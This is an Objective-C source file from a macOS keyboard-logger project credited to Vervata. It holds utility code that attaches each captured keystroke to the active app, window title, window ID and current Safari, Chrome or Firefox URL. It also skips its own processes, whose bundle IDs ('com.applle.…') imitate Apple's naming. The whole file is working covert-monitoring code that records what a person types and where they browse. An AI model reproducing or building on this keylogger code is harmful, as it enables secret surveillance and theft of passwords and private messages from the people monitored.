//
//  KeyboardLoggerUtils.m
//  KeyboardLoggerManager
//
//  Created by Makara Khloth on 10/30/13.
//  Copyright (c) 2013 Vervata. All rights reserved.
//

#import "KeyboardLoggerUtils.h"

#import "SystemUtilsImpl.h"
#import "FirefoxUrlInfoInquirer.h"
#import "Firefox.h"

@interface KeyboardLoggerUtils (private)
+ (NSNumber *) frontmostWindowIDWithBundleID: (NSString *) aBundleID;
@end

@implementation KeyboardLoggerUtils

+ (NSString *) getCurrentAppID {
    @try{
        NSRunningApplication * runningAtFront = [[NSWorkspace sharedWorkspace] frontmostApplication];
        return [runningAtFront bundleIdentifier];
    }
    @catch (NSException *exception){
        DLog(@"### exception %@",exception);
    }
}

+ (NSString *) safariUrl {
    @try {
        NSString *url = nil;
        NSAppleScript *scpt = [[NSAppleScript alloc] initWithSource:@"tell application \"Safari\" \n return{ URL of current tab of window 1,name of current tab of window 1} \n end tell"];
        NSAppleEventDescriptor *scptResult = [scpt executeAndReturnError:nil];
        url = [[scptResult descriptorAtIndex:1] stringValue];
        if (!url) {
            url = @"";
        }
        [scpt release];
        return (url);
    }
    @catch (NSException *exception) {
        DLog(@"### exception %@",exception);
    }
    return @"";
}

+ (NSString *) chromeUrl {
    @try {
        NSString *url = nil;
        NSAppleScript *scpt = [[NSAppleScript alloc] initWithSource:@"tell application \"Google Chrome\" to return {URL of active tab of front window, title of active tab of front window}"];
        NSAppleEventDescriptor *scptResult = [scpt executeAndReturnError:nil];
        url = [[scptResult descriptorAtIndex:1] stringValue];
        if (!url) {
            url = @"";
        }
        [scpt release];
        return (url);
    }
    @catch (NSException *exception) {
        DLog(@"### exception %@",exception);
    }
    return @"";
}

+ (NSString *) firefoxUrl: (NSNumber *) aActivePID {

    NSString *url = nil;
    @try {
        // Support multiple profiles
        NSString *title = nil;
        //FirefoxApplication *firefoxApp = (FirefoxApplication *)[SBApplication applicationWithBundleIdentifier:@"org.mozilla.firefox"];
        FirefoxApplication *firefoxApp = (FirefoxApplication *)[SBApplication applicationWithProcessIdentifier:aActivePID.intValue];
        for (FirefoxWindow *window in [[firefoxApp windows] get]) {
            if (window.titled) { // Only one window that have title among all
                title = [window name];
                /*
                DLog(@"###########################################################");
                DLog(@"#### --> name: %@", [window name]);
                DLog(@"#### --> index: %ld", (long)[window index]);
                DLog(@"#### --> miniaturizable: %d", window.miniaturizable);
                DLog(@"#### --> miniaturized: %d", window.miniaturized);
                DLog(@"#### --> modal: %d", window.modal);
                DLog(@"#### --> resizable: %d", window.resizable);
                DLog(@"#### --> titled: %d", window.titled);
                DLog(@"#### --> visible: %d", window.visible);
                DLog(@"#### --> zoomable: %d", window.zoomable);
                DLog(@"#### --> zoomed: %d", window.zoomed);
                DLog(@"#### --> id: %ld", (long)[window id]);
                DLog(@"#### --> floating: %d", window.floating);
                DLog(@"#### --> bounds: %@", NSStringFromRect(window.bounds));
                DLog(@"#### --> closeable: %d", window.closeable);
                DLog(@"#### --> document.name: %@", window.document.name);
                DLog(@"#### --> document.path: %@", window.document.path);
                DLog(@"#### --> document.modified: %d", window.document.modified);
                DLog(@"#### --> properties: %@", window.properties);
                DLog(@"###########################################################");*/

                //DLog(@"#### ---> url title : %@", title);
                break;
            }
        }
        
        if (title.length == 0) {
            title = [SystemUtilsImpl frontApplicationWindowTitleWithPID:aActivePID];
            //DLog(@"#### url title : %@", title);
        }
        
        FirefoxUrlInfoInquirer *firefoxInquirer = [[[FirefoxUrlInfoInquirer alloc] initWithFirefoxPID:aActivePID.intValue] autorelease];
        url = [firefoxInquirer urlWithTitle:title];
    }
    @catch (NSException *e) {
        DLog(@"------> KeyboardLogger Firefox url title exception, %@", e);
    }
    @catch (...) {
        DLog(@"------> KeyboardLogger Firefox url title unknown exception");
    }
    
    if (!url) {
        url = @"";
    }
    return (url);
}

+ (NSMutableDictionary *) mergeKeyInfo: (NSDictionary *) aKeyInfo1 withKeyInfo: (NSDictionary *) aKeyInfo2 {
    NSMutableDictionary *keyInfo = [[[NSMutableDictionary alloc]init] autorelease];
    [keyInfo setObject:[aKeyInfo2 objectForKey:@"name"] forKey:@"name"];
    [keyInfo setObject:[aKeyInfo2 objectForKey:@"identifier"] forKey:@"identifier"];
  
    if ([[aKeyInfo2 objectForKey:@"title"] length] > 0) {
        [keyInfo setObject:[aKeyInfo2 objectForKey:@"title"] forKey:@"title"];
    }
    
    NSMutableArray *word1 = [aKeyInfo1 objectForKey:@"word"];
    NSMutableArray *word2 = [aKeyInfo2 objectForKey:@"word"];
    NSMutableArray *word = [NSMutableArray arrayWithArray:[word1 arrayByAddingObjectsFromArray:word2]];

    [keyInfo setObject:word forKey:@"word"];
    NSMutableArray *raw1 = [aKeyInfo1 objectForKey:@"raw"];
    NSMutableArray *raw2 = [aKeyInfo2 objectForKey:@"raw"];
    NSMutableArray *raw = [NSMutableArray arrayWithArray:[raw1 arrayByAddingObjectsFromArray:raw2]];

    [keyInfo setObject:raw forKey:@"raw"];
    [keyInfo setObject:[aKeyInfo2 objectForKey:@"url"] forKey:@"url"];
    [keyInfo setObject:[aKeyInfo2 objectForKey:@"screen"] forKey:@"screen"];
    [keyInfo setObject:[aKeyInfo2 objectForKey:@"frontmostwindow"] forKey:@"frontmostwindow"];
    return (keyInfo);
}

+ (NSMutableDictionary *) getPreviousKeyInfoWithArray: (NSArray *) aKeyLoggerArray byNewKeyInfo: (NSDictionary *) aNewKeyInfo {
    NSMutableDictionary *previousKeyInfo = nil;
    NSString *newBundleID = [aNewKeyInfo objectForKey:@"identifier"];
    for (NSMutableDictionary *info in aKeyLoggerArray) {
        NSString *bundleID = [info objectForKey:@"identifier"];
        if ([bundleID isEqualToString:newBundleID]) {
            previousKeyInfo = info;
            break;
        }
    }
    return (previousKeyInfo);
}

+ (NSMutableDictionary *) getKeyInfoWithKeyString:(NSString *)aKeyString rawKeyRep: (NSString *) aRawKeyRep activeAppInfo:(NSDictionary *)aActiveAppInfo psn:(ProcessSerialNumber)aPSN {
    NSMutableDictionary * keyInfo = nil;
    
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
    pid_t pid = 0;
    CFStringRef processName = nil;
    if (CopyProcessName(&aPSN, &processName) == noErr) {
        if (![(NSString *)processName isEqualToString:@"com.apple.appkit.xpc.openAndSavePanelService"] &&
            ![(NSString *)processName isEqualToString:@"Internet Accounts"] &&
            [(NSString *)processName rangeOfString:@"com.apple.preference"].location == NSNotFound) {
            GetProcessPID(&aPSN, &pid);
        }
    }
    if (processName) {
        CFRelease(processName);
    }
#pragma GCC diagnostic pop
    
    NSNumber *activePID = nil;
    NSString *activeBundleID = nil;
    if (pid != 0) {
        activePID = [NSNumber numberWithInteger:pid];
        activeBundleID = [SystemUtilsImpl applicationIDWithPID:[NSNumber numberWithInteger:pid]];
    } else {
        activePID = [SystemUtilsImpl frontApplicationPID];
        activeBundleID = [SystemUtilsImpl frontApplicationID];
    }
    DLog(@"activePID, %@", activePID);
    DLog(@"activeBundleID, %@", activeBundleID);
    
    NSString *myBundleID = [[NSBundle mainBundle] bundleIdentifier];
    
    if (aKeyString != nil &&
        ![activeBundleID isEqualToString:myBundleID] &&
        ![activeBundleID isEqualToString:@"com.applle.blblu"] &&
        ![activeBundleID isEqualToString:@"com.applle.kbls"]) {
        
        NSString *activeAppName = [SystemUtilsImpl applicationNameWithPID:activePID];
        NSString *title= [SystemUtilsImpl frontApplicationWindowTitleWithPID:activePID]; // Could use window list if AX fail to get window title
        NSNumber *frontMostWindowID = [self frontmostWindowIDWithBundleID:activeBundleID];
        
        DLog(@"activeAppName, %@", activeAppName);
        DLog(@"title, %@", title);
        DLog(@"frontMostWindowID, %@", frontMostWindowID);
        
        keyInfo = [[[NSMutableDictionary alloc]init] autorelease];
        [keyInfo setObject:activeAppName forKey:@"name"];
        [keyInfo setObject:activeBundleID forKey:@"identifier"];
      
        if (title && title.length > 0) {
            [keyInfo setObject:title forKey:@"title"];
        }
        
        [keyInfo setObject:[NSMutableArray arrayWithObject:aKeyString] forKey:@"word"];
        if ([aRawKeyRep length] > 0) {
            [keyInfo setObject:[NSMutableArray arrayWithObject:aRawKeyRep] forKey:@"raw"];
        }else{
            [keyInfo setObject:[NSMutableArray arrayWithObject:aKeyString] forKey:@"raw"];
        }
        
        if ([activeBundleID isEqualToString:@"com.apple.Safari"] ) {
            [keyInfo setObject:[self safariUrl] forKey:@"url"];
        } else if ([activeBundleID isEqualToString:@"org.mozilla.firefox"] ) {
            [keyInfo setObject:[self firefoxUrl:activePID] forKey:@"url"];
        } else if ([activeBundleID isEqualToString:@"com.google.Chrome"]) {
            [keyInfo setObject:[self chromeUrl] forKey:@"url"];
        } else {
            [keyInfo setObject:@"" forKey:@"url"];
        }
        [keyInfo setObject:[NSScreen mainScreen] forKey:@"screen"];
        [keyInfo setObject:frontMostWindowID forKey:@"frontmostwindow"];
        
        DLog(@"url, %@", keyInfo[@"url"]);
    }
    
    return (keyInfo);
}

+ (NSArray *) windowDictsOfSavePanelService {
    NSMutableArray * windowDicts = [NSMutableArray array];
    NSArray *runningApps = [NSRunningApplication runningApplicationsWithBundleIdentifier:@"com.apple.appkit.xpc.openAndSavePanelService"];
    
    for (NSRunningApplication *savePanelServiceApp in runningApps) {
        pid_t pid = [savePanelServiceApp processIdentifier];
        DLog(@"PID of savePanelServiceApp = %d", pid);
        if (pid != 0) {
            CGWindowListOption listOptions = kCGWindowListOptionOnScreenOnly | kCGWindowListExcludeDesktopElements;
            CFArrayRef windowList = CGWindowListCopyWindowInfo(listOptions, kCGNullWindowID);
            for (int i = 0; i < (int)[(NSArray *)windowList count]; i++) {
                NSDictionary * windowDict = [(NSArray *)windowList objectAtIndex:i];
                NSNumber *windowPID = [windowDict objectForKey:(NSString *)kCGWindowOwnerPID];
                if (pid == [windowPID intValue]) {
                    DLog(@"savePanelServiceApp, windowDict(%d) = %@", i, windowDict);
                    NSNumber *windowStoreType = [windowDict objectForKey:(NSString *)kCGWindowStoreType];
                    if ([windowStoreType intValue] != kCGBackingStoreNonretained) {
                        [windowDicts addObject:windowDict];
                    }
                }
            }
            
            CFBridgingRelease(windowList);
        }
    }

    return (windowDicts);
}

+ (NSDictionary *) embeddedWindowDictWithPID: (pid_t) aPID {
    NSDictionary *embWindowDict = nil;
    if (aPID != 0) {
        CGWindowListOption listOptions = kCGWindowListOptionAll ;
        CFArrayRef windowList = CGWindowListCopyWindowInfo(listOptions, kCGNullWindowID);
        for (int i = 0; i < (int)[(NSArray *)windowList count]; i++) {
            NSDictionary * windowDict = [(NSArray *)windowList objectAtIndex:i];
            NSNumber *windowPID = [windowDict objectForKey:(NSString *)kCGWindowOwnerPID];
            if (aPID == [windowPID intValue]) {
                embWindowDict = (NSDictionary *)windowDict;
                break;
            }
        }
        
        CFBridgingRelease(windowList);
    }
    return (embWindowDict);
}

+ (BOOL) isEmbeddedWindowInFocused: (pid_t) aEmbeddedPID inRemoteApp:(pid_t)aRemotePID {
    __block BOOL isInFocused = NO;
    
    NSArray *embeddedWindowsArray = [KeyboardLoggerUtils embeddedWindowsArrayWithPID:aEmbeddedPID];
    if (embeddedWindowsArray.count > 0) {
        AXUIElementRef process = AXUIElementCreateApplication(aRemotePID);
        
        AXUIElementRef focusedWindow = nil;
        AXUIElementCopyAttributeValue(process, kAXFocusedWindowAttribute, (CFTypeRef *)&focusedWindow);
        //DLog(@"focusedWindow = %@", focusedWindow);
        
        CGSize size;
        AXValueRef sizeValue = nil;
        
        AXUIElementCopyAttributeValue(focusedWindow, kAXSizeAttribute, (CFTypeRef *)&sizeValue);
        AXValueGetValue(sizeValue, kAXValueCGSizeType, &size);
        //DLog(@"width = %f, height = %f", size.width, size.height);
        
        CGPoint position;
        AXValueRef positionValue = nil;
        
        AXUIElementCopyAttributeValue(focusedWindow, kAXPositionAttribute, (CFTypeRef *)&positionValue);
        AXValueGetValue(positionValue, kAXValueCGPointType, &position);
        //DLog(@"X = %f, Y = %f", position.x, position.y);
        
        if (positionValue) CFRelease(positionValue);
        if (sizeValue) CFRelease(sizeValue);
        if (focusedWindow) CFRelease(focusedWindow);
        if (process) CFRelease(process);
        
        [embeddedWindowsArray enumerateObjectsUsingBlock:^(NSDictionary *windowDict, NSUInteger idx, BOOL * /*_Nonnull*/ stop) {
            NSDictionary *windowBoundDict = [windowDict objectForKey:(NSString *)kCGWindowBounds];
            
            CGRect windowRect;
            CGRectMakeWithDictionaryRepresentation((CFDictionaryRef)windowBoundDict, &windowRect);
            //DLog(@"Window X = %f, Y = %f", windowRect.origin.x, windowRect.origin.y);
            //DLog(@"Window width = %f, height = %f", windowRect.size.width, windowRect.size.height);
            if (CGPointEqualToPoint(windowRect.origin, position) && CGSizeEqualToSize(windowRect.size, size)) {
                DLog(@"Post to embedded");
                isInFocused = YES;
                *stop = YES;
            }
        }];
    }
    
    return isInFocused;
}

+ (NSArray *) embeddedWindowsArrayWithPID: (pid_t) aPID {
    NSMutableArray *embWindowArray = [NSMutableArray array];
    if (aPID != 0) {
        CGWindowListOption listOptions = kCGWindowListOptionAll ;
        CFArrayRef windowList = CGWindowListCopyWindowInfo(listOptions, kCGNullWindowID);
        for (int i = 0; i < (int)[(NSArray *)windowList count]; i++) {
            NSDictionary * windowDict  = [(NSArray *)windowList objectAtIndex:i];
            NSNumber *windowPID = [windowDict objectForKey:(NSString *)kCGWindowOwnerPID];
            if (aPID == [windowPID intValue]) {
                [embWindowArray addObject:windowDict];
            }
        }
        
        CFBridgingRelease(windowList);
    }
    
    NSArray *resultEmbWindowArray = [NSArray arrayWithArray:embWindowArray];
    return (resultEmbWindowArray);
}


#pragma mark - Private methods -

+ (NSNumber *) frontmostWindowIDWithBundleID: (NSString *) aBundleID {
    NSNumber *frontmostWindowID = [NSNumber numberWithInteger:NSIntegerMax];
    NSArray *rApps = [NSRunningApplication runningApplicationsWithBundleIdentifier:aBundleID];
    NSRunningApplication *rApp = [rApps firstObject];
    NSNumber *activeAppPID = [NSNumber numberWithInteger:[rApp processIdentifier]];
    CGRect frontWindowRect = [SystemUtilsImpl frontmostWindowRectWithPID:activeAppPID];
    CGWindowListOption listOptions = kCGWindowListOptionOnScreenOnly | kCGWindowListExcludeDesktopElements;
    CFArrayRef windowList = CGWindowListCopyWindowInfo(listOptions, kCGNullWindowID);
    for (int i = 0; i < [(NSArray *)windowList count]; i++) {
        NSDictionary * windowDict  = [(NSArray *)windowList objectAtIndex:i];
        NSNumber *windowPID = [windowDict objectForKey:(NSString *)kCGWindowOwnerPID];
        NSNumber *windowLayer = [windowDict objectForKey:(NSString *)kCGWindowLayer];
        CGRect windowBounds = CGRectNull;
        CGRectMakeWithDictionaryRepresentation((CFDictionaryRef)[windowDict objectForKey:(NSString *)kCGWindowBounds], &windowBounds);
        if ([activeAppPID isEqualToNumber:windowPID] && [windowLayer integerValue] == 0 &&
            CGSizeEqualToSize(frontWindowRect.size, windowBounds.size) && CGPointEqualToPoint(frontWindowRect.origin, windowBounds.origin)) {
            frontmostWindowID = [windowDict objectForKey:(NSString *)kCGWindowNumber];
            break;
        }
    }
    CFBridgingRelease(windowList);
    //DLog(@"activeAppPID = %@, rApp = %@", activeAppPID, rApp);
    //DLog(@"frontWindowRect = %@", NSStringFromRect(NSRectFromCGRect(frontWindowRect)));
    //DLog(@"frontmostWindowID = %@", frontmostWindowID);
    return (frontmostWindowID);
}

@end
